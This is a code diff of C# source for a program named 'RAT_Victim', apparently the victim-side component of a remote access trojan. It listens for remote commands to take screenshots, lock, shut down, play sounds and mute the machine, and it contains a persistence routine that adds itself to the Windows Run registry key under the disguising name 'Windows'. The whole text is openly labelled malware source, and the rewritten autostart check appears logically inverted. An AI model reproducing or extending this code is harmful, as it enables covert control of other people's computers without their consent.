@@ -2,7 +2,6 @@
 using RAT_Library;
 using System;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Windows.Forms;
@@ -15,20 +14,8 @@ namespace RAT_Victim
 
         private static void Main()
         {
-            AutoStart(false);
+            //AddToAutoStart();
             StartServer();
-        }
-
-        private static void AutoStart(bool add)
-        {
-            var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
-            const string appName = "Windows";
-            var valueExists = subKey.GetValue(appName) != null;
-            
-            if (add && !valueExists)
-                subKey.SetValue(appName, Application.ExecutablePath);
-            else if (!add && valueExists)
-                subKey.DeleteValue(appName);
         }
 
         private static void StartServer()
@@ -55,7 +42,7 @@ namespace RAT_Victim
                         Commands.TakeScreenshot();
                         break;
                     case RatCommand.Lock:
-                        Commands.Lock();
+                        WinApi.LockWorkStation();
                         break;
                     case RatCommand.Shutdown:
                         Commands.Shutdown();
@@ -66,11 +53,21 @@ namespace RAT_Victim
                     case RatCommand.PlaySound:
                         Commands.PlaySound(new MemoryStream(buffer, 1, byteCount));
                         break;
+                    case RatCommand.Mute:
+                        WinApi.keybd_event(Keys.VolumeMute, 0, 0, 0);
+                        break;
                     default:
                         throw new ArgumentOutOfRangeException();
                 }
             }
-            // ReSharper disable once FunctionNeverReturns
+        }
+
+        private static void AddToAutoStart()
+        {
+            var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            const string appName = "Windows";
+            if (subKey.GetValue(appName) != null)
+                subKey.SetValue(appName, Application.ExecutablePath);
         }
     }
 }
